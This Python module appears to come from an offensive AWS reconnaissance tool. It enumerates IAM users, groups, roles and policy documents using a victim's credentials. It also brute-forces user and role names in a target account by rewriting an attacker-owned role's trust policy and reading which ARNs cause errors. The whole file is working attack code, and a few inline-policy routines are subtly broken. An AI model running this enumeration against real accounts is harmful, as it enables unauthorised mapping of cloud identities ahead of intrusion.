import json, botocore
import sys

import modules.globals as my_globals
from colorama import Fore

from modules.globals import victim_groups
from modules.utils import custom_serializer

def iam_init_enum(victim_iam_client, attacker_client):
    if victim_iam_client:
        list_iam_users(victim_iam_client, my_globals.victim_aws_account_ID)
        list_iam_groups(victim_iam_client, my_globals.victim_aws_account_ID)
        list_iam_groups_for_current_user(victim_iam_client, my_globals.victim_aws_username)
        list_group_policies(victim_iam_client, my_globals.victim_groups)
        list_current_user_policies(victim_iam_client, my_globals.victim_aws_username)
        list_iam_policies(victim_iam_client, my_globals.victim_aws_account_ID)
        list_iam_roles(victim_iam_client, my_globals.victim_aws_account_ID)
        list_role_attached_policies(victim_iam_client, my_globals.victim_roles)
    if attacker_client and my_globals.user_name_wordlist and my_globals.start_username_brute_force:
        brute_force_usernames(attacker_client)
    if attacker_client and my_globals.user_name_wordlist and my_globals.start_role_name_brute_force:
        brute_force_role_names(attacker_client)

########################## Users ##########################

def list_iam_users(iam_client, aws_id):
    print(f"{Fore.GREEN}Listing IAM Users...")
    try:
        users = iam_client.list_users().get("Users", [])
        for user in users:
            if aws_id in user['Arn']:  # Only print users from the specified account
                print(f"{Fore.MAGENTA}User: {user['UserName']} | ARN: {user['Arn']}")
    except KeyboardInterrupt:
        raise
    except:
        print(f"{Fore.LIGHTBLACK_EX}Failed to list IAM Users")

########################## Groups ##########################

def list_iam_groups(iam_client, aws_id):
    print(f"{Fore.GREEN}Listing IAM Groups...")
    try:
        groups = iam_client.list_groups().get("Groups", [])
        my_globals.victim_groups = groups
        for group in groups:
            if aws_id in group['Arn']:  # Only print groups from the specified account
                print(f"{Fore.MAGENTA}User: {group['GroupName']} | ARN: {group['Arn']}")
    except KeyboardInterrupt:
        raise
    except:
        print(f"{Fore.LIGHTBLACK_EX}Failed to list IAM Groups")

def list_iam_groups_for_current_user(iam_client, user_name):
    print(f"{Fore.GREEN}Listing IAM Groups For Current User...")
    try:
        groups = iam_client.list_groups_for_user(UserName=user_name).get("Groups", [])
        for group in groups:
            print(f"{Fore.MAGENTA}User: {group['GroupName']} | ARN: {group['Arn']}")
    except KeyboardInterrupt:
        raise
    except Exception as e:
        print(f"{Fore.LIGHTBLACK_EX}Failed to list IAM Groups For Current User")

########################## All Customer Managed Policies ##########################

def list_iam_policies(iam_client, aws_id):
    print(f"{Fore.GREEN}Listing IAM Policies...")
    try:
        policies = iam_client.list_policies(Scope='All').get("Policies", [])
        for policy in policies:
            if (aws_id in policy['Arn']): # Only print customer managed policies
                print(f"{Fore.CYAN}Policy: {policy['PolicyName']} | ARN: {policy['Arn']}")
                describe_iam_policy(iam_client, policy['Arn'])
    except KeyboardInterrupt:
        raise
    except:
        print(f"{Fore.LIGHTBLACK_EX}Failed to list IAM policies")

def list_iam_roles(iam_client, aws_id):
    print(f"{Fore.GREEN}Enumerating IAM Roles...")
    try:
        roles = iam_client.list_roles().get("Roles", [])
        my_globals.victim_roles = roles
        for role in roles:
            if (aws_id in role['Arn']):  # Only print customer managed roles
                print(f"{Fore.CYAN}Role: {role['RoleName']} | ARN: {role['Arn']}")
                describe_iam_role(iam_client, role['RoleName'])
    except KeyboardInterrupt:
        raise
    except:
        print(f"{Fore.LIGHTBLACK_EX}Failed to list IAM roles")

########################## Inline & attached user policies ##########################

def list_current_user_policies(iam_client, user_name):
    print(f"{Fore.GREEN}Enumerating Current User Policies...")
    try:
        inline_policies = iam_client.list_user_policies(UserName=user_name).get("PolicyNames", [])
        if inline_policies:
            print(f"{Fore.MAGENTA}Inline Policies:")
            for policy in inline_policies:
                print(f"{Fore.MAGENTA}- {policy['PolicyName']} (ARN: {policy['PolicyArn']})")
                describe_iam_policy(iam_client, policy['PolicyArn'])
        else:
            print(f"{Fore.LIGHTBLACK_EX}No inline policies found.")
    except KeyboardInterrupt:
        raise
    except:
        print(f"{Fore.LIGHTBLACK_EX}Failed to enumerate user inline policies")

    try:
        attached_policies = iam_client.list_attached_user_policies(UserName=user_name).get("AttachedPolicies", [])
        if attached_policies:
            print(f"{Fore.MAGENTA}Attached Policies:")
            for policy in attached_policies:
                print(f"{Fore.MAGENTA}- {policy['PolicyName']} (ARN: {policy['PolicyArn']})")
                describe_iam_policy(iam_client, policy['PolicyArn'])
        else:
            print(f"{Fore.LIGHTBLACK_EX}No attached policies found.")
    except KeyboardInterrupt:
        raise
    except:
        print(f"{Fore.LIGHTBLACK_EX}Failed to enumerate user attached policies")

########################## Inline & attached group policies ##########################

def list_group_policies(iam_client, groups):
    if groups:
        print(f"{Fore.GREEN}Enumerating Policies For All Groups...")
        for group in groups:
            print(f"{Fore.CYAN}Group: {group['Arn']}")
            group_name = group["GroupName"]
            try:
                # Inline policies attached directly to the group
                inline_policies = iam_client.list_group_policies(GroupName=group_name).get("PolicyNames", [])
                if inline_policies:
                    for policy_name in inline_policies:
                        print(f"{Fore.MAGENTA}- {policy['PolicyName']} (ARN: {policy['PolicyArn']})")
                        describe_iam_policy(iam_client, policy['PolicyArn'])
                else:
                    print(f"{Fore.LIGHTBLACK_EX}No inline policies found.")
            except KeyboardInterrupt:
                raise
            except:
                print(f"{Fore.LIGHTBLACK_EX}Failed to enumerate inline policies for group: {group_name}")

            try:
                # Managed policies attached to the group
                attached_policies = iam_client.list_attached_group_policies(GroupName=group_name).get("AttachedPolicies", [])
                if attached_policies:
                    for policy in attached_policies:
                        print(f"{Fore.MAGENTA}- {policy['PolicyName']} (ARN: {policy['PolicyArn']})")
                        describe_iam_policy(iam_client, policy['PolicyArn'])
                else:
                    print(f"{Fore.LIGHTBLACK_EX}No attached policies found.")
            except KeyboardInterrupt:
                raise
            except:
                print(f"{Fore.LIGHTBLACK_EX}Failed to enumerate attached policies for group: {group_name}")

########################## Attached role policies ##########################

def list_role_attached_policies(iam_client, roles):
    if roles:
        print(f"{Fore.GREEN}Enumerating Policies For All Roles...")
        for role in roles:
            print(f"{Fore.CYAN}Role: {role['Arn']}")
            role_name = role["RoleName"]
            try:
                attached_policies = iam_client.list_attached_role_policies(RoleName=role_name).get("AttachedPolicies", [])
                if attached_policies:
                    print(f"{Fore.MAGENTA}Attached Policies:")
                    for policy in attached_policies:
                        print(f"{Fore.MAGENTA}- {policy['PolicyName']} (ARN: {policy['PolicyArn']})")
                        describe_iam_policy(iam_client, policy['PolicyArn'])
                else:
                    print(f"{Fore.LIGHTBLACK_EX}No attached policies found.")
            except KeyboardInterrupt:
                raise
            except:
                print(f"{Fore.LIGHTBLACK_EX}Failed to enumerate attached policies for role: {role_name}")

########################## Helper functions: Describe policies and roles ##########################

def describe_iam_policy(iam_client, policy_arn):
    try:
        version_id = iam_client.get_policy(PolicyArn=policy_arn)["Policy"]["DefaultVersionId"]
        policy_doc = iam_client.get_policy_version(PolicyArn=policy_arn, VersionId=version_id)["PolicyVersion"]["Document"]
        print(f"{Fore.YELLOW}{json.dumps(policy_doc, indent=4, sort_keys=True, default=custom_serializer)}")
    except KeyboardInterrupt:
        raise
    except:
        print(f"{Fore.LIGHTBLACK_EX}Failed to describe policy {policy_arn}")

def describe_iam_role(iam_client, role_name):
    try:
        role_detail = iam_client.get_role(RoleName=role_name)["Role"]
        print(f"{Fore.YELLOW}{json.dumps(role_detail['AssumeRolePolicyDocument'], indent=4, sort_keys=True, default=custom_serializer)}")
    except KeyboardInterrupt:
        raise
    except:
        print(f"{Fore.LIGHTBLACK_EX}Failed to describe role {role_name}")

########################## Brute force usernames and roles ##########################

def brute_force_usernames(client):
    with open(str(my_globals.user_name_wordlist), 'r') as f:
        word_list = f.read().splitlines()

    print(f"{Fore.GREEN}Starting username brute-force...")

    print(f"{Fore.YELLOW}[*] This script does not check if the keys you supplied have the correct permissions."
          f" Make sure they are allowed to use iam:UpdateAssumeRolePolicy on the role that was provided inside the config file")
    if my_globals.victim_aws_account_ID is None:
        print(f"{Fore.YELLOW}[*] You didn't supply victim AWS account ID in \"enum.config.json\" config file. Can't run username brute-force")
        return

    print(f"{Fore.CYAN}Targeting aws account ID: {my_globals.victim_aws_account_ID} for username brute-force\n")

    found_users = []

    # Handle ARN's if they were accidentally passed here
    if "/" in my_globals.attacker_IAM_role_name:
        my_globals.attacker_IAM_role_name = my_globals.attacker_IAM_role_name.split("/")[-1]

    for word in word_list:
        user_arn = f"arn:aws:iam::{my_globals.victim_aws_account_ID}:user/{word}"

        try:
            policy_doc = '''
                        {{
                            "Version":"2012-10-17",
                            "Statement":[{{
                                "Effect":"Deny",
                                "Principal":{{"AWS":"{}"}},
                                "Action":"sts:AssumeRole"
                            }}]
                        }}'''.format(user_arn).strip()

            client.update_assume_role_policy(
                RoleName=my_globals.attacker_IAM_role_name,
                PolicyDocument=policy_doc,
            )

            if user_arn not in found_users:
                found_users.append(user_arn)
                users = "\n".join(found_users)
                sys.stdout.write(f"\033[1A\r\033[K{Fore.MAGENTA}{user_arn}\n")

        except KeyboardInterrupt:
            raise
        except botocore.exceptions.ClientError as e:
            if "MalformedPolicyDocument" in str(e):
                pass  # User doesn't exist
        except:
            print(f"{Fore.LIGHTBLACK_EX}Failed to run username brute-force for AWS account ID: {my_globals.victim_aws_account_ID}")
            break

        sys.stdout.write(f"{Fore.CYAN}\rBrute-forcing.... {word}\033[K")
        sys.stdout.flush()
    print(f"{Fore.MAGENTA}\nFound {len(found_users)} users")

def brute_force_role_names(client):
    with open(str(my_globals.role_name_wordlist), 'r') as f:
        word_list = f.read().splitlines()

    print(f"{Fore.GREEN}Starting role name brute-force...")

    print(f"{Fore.YELLOW}[*] This script does not check if the keys you supplied have the correct permissions."
          f" Make sure they are allowed to use iam:UpdateAssumeRolePolicy on the role that was provided inside the config file")
    if my_globals.victim_aws_account_ID is None:
        print(
            f"{Fore.YELLOW}[*] You didn't supply victim AWS account ID in \"enum.config.json\" config file. Can't run role name brute-force")
        return

    print(f"{Fore.CYAN}Targeting aws account ID: {my_globals.victim_aws_account_ID} for role name brute-force\n")

    found_roles = []

    # Handle ARN's if they were accidentally passed here
    if "/" in my_globals.attacker_IAM_role_name:
        my_globals.attacker_IAM_role_name = my_globals.attacker_IAM_role_name.split("/")[-1]

    for word in word_list:
        role_arn = f"arn:aws:iam::{my_globals.victim_aws_account_ID}:role/{word}"

        try:
            policy_doc = '''    
                        {{
                            "Version":"2012-10-17",
                            "Statement":[{{
                                "Effect":"Deny",
                                "Principal":{{"AWS":"{}"}},
                                "Action":"sts:AssumeRole"
                            }}]
                        }}'''.format(role_arn).strip()

            client.update_assume_role_policy(
                RoleName=my_globals.attacker_IAM_role_name,
                PolicyDocument=policy_doc,
            )

            if role_arn not in found_roles:
                found_roles.append(role_arn)
                roles = "\n".join(found_roles)
                sys.stdout.write(f"\033[1A\r\033[K{Fore.MAGENTA}{role_arn}\n")
        except KeyboardInterrupt:
            raise
        except botocore.exceptions.ClientError as e:
            if "MalformedPolicyDocument" in str(e):
                pass  # Role doesn't exist
        except:
            print(
                f"{Fore.LIGHTBLACK_EX}Failed to run role name brute-force for AWS account ID: {my_globals.victim_aws_account_ID}")
            break

        sys.stdout.write(f"{Fore.CYAN}\rBrute-forcing.... {word}\033[K")
        sys.stdout.flush()
    print(f"{Fore.MAGENTA}\nFound {len(found_roles)} roles")